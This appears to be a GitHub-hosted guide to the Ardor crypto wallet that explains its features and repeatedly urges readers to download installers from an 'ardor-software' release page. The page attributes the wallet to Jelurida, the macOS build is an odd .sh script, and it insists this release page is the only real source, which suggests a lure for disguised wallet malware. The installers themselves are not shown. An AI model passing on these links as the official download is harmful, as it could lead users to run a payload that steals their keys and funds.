![Ardor Wallet guide](assets/banner-article.png)

# What the Ardor wallet is, and which download is the real one

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor wallet is the desktop application Jelurida publishes for the Ardor platform. One passphrase or seed opens your ARDR account and every Ardor child chain, and the app either downloads the blockchain to your own machine or reads it from a remote node. It runs on Windows, macOS and Linux, and the current build is published on the GitHub releases page.

## What the wallet is

The Ardor wallet is a self-custody client: the keys never leave your computer, and the [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) or seed you write down is the only thing that can move your funds. There is no account on a server to log in to, no email address attached to the wallet and no password reset. That single design decision explains most of the questions people ask about it, from a forgotten passphrase to a balance that shows zero while the chain is still downloading.

It is also the client for the whole platform, not just for ARDR. Ardor runs several child chains beside its own parent chain, and the same wallet opens all of them with the same secret. Ignis, the Nxt [child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md), Bitswift and Triffic all appear in the same window, each with its own token and its own transaction history.

## What it lets you do

The wallet is a full participant in the network, not a viewer. What it exposes depends on the mode you run, but the feature set is the same on every platform:

- Hold and send ARDR on the parent chain, and hold and send the token of each child chain.
- Forge, or lease your forging power to another account without giving up control of the coins.
- Trade on the built-in coin exchange and the asset exchange, including issued assets with royalties and dividend payments.
- Issue your own asset or custom currency, run a poll, list something on the marketplace, or shuffle coins for privacy.
- Store data in the data cloud, timestamp a document, or set up a phased or multisig transaction.

None of that needs a second application. The wallet is where the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) lives, and the features are tabs inside it.

## What you need before you start

The wallet runs on a [Java](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/fix-ardor-wallet-java-error.md) runtime, and the two things that stop a first install are almost always Java and disk space.

| Requirement | What it means in practice |
|---|---|
| Java runtime | Java 8 is the stated minimum and Java 11 is recommended. A missing runtime is the usual cause of a wallet that closes on start. |
| Disk space | A full client stores the blockchain locally and grows with it. A light client stores nothing and reads from remote nodes. |
| A written secret | The passphrase or seed, on paper, before the account holds anything. There is no second copy anywhere. |

## How to get it

1. Open the GitHub releases page for the wallet and read the notes for the current release. That page is the only place a build should come from.
2. Download the asset that matches your system: a Windows installer, a macOS package, or the Linux archive.
3. Check the file before you run it, following the same hash the release publishes for that asset.
4. Start the app and choose full client or light client. The choice can be changed later, so a first run does not have to be permanent.
5. Write your passphrase or seed down before you fund the account, then confirm you can open the same account again.

If any of those steps is unclear, the install walkthrough covers each platform in order, and the verification guide covers the hash check on its own.

## Full client or light client

A full client downloads the blockchain and validates it locally. It is the correct choice for forging and for anyone who wants the wallet to be independent of someone else's server. It needs disk space and a first sync that takes time.

A light client keeps no chain data and reads balances from remote nodes. It starts in seconds and suits a laptop that is opened occasionally. The trade-off is that a remote node can lag behind the chain, which is why a light client sometimes reports a balance that looks wrong until the node catches up.

## What the wallet is not

The wallet does not hold your funds on your behalf, so there is nobody to ask for a refund, a reversal or a reset. It does not create an account in the usual sense: an account exists as soon as a passphrase or seed produces an address, whether or not anyone has ever used it. And it is not a staking product. Ardor calls block generation forging, the reward is the transaction fees in the blocks you forge, and there is no advertised yield to compare with a staking service.

The read-only web client is a separate thing. It displays balances and cannot send a transaction, which is why a withdrawal attempted there fails.

## FAQ

### Is there an Ardor wallet app for Android or iOS?

The wallet itself is a desktop application. Ardor Lite is a separate iOS app that signs locally and covers Ardor and all child chains, and the download page also lists an Android full node build. Use the desktop wallet when you need every feature.

### Can I use the wallet without downloading the blockchain?

Yes. Choose the light client on first start, or switch an existing install to it. The wallet then reads the chain from remote nodes and needs no local database.

### Does the wallet hold Ignis and Nxt too?

Yes. One passphrase opens the parent chain and every child chain, including Ignis and the Nxt child chain, and each chain shows its own balance and history in the same window.

### Is the Ardor wallet free?

The software is free and open source. Network fees are separate: transactions on the parent chain are paid in ARDR, and a child chain transaction is normally wrapped by a bundler that pays the ARDR fee for you.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Install the Ardor wallet on Windows, macOS or Linux](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md)
- [Verify an Ardor wallet download before you run it](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md)
- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Ardor passphrase or seed phrase: which one do you have](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-passphrase-versus-seed-phrase.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
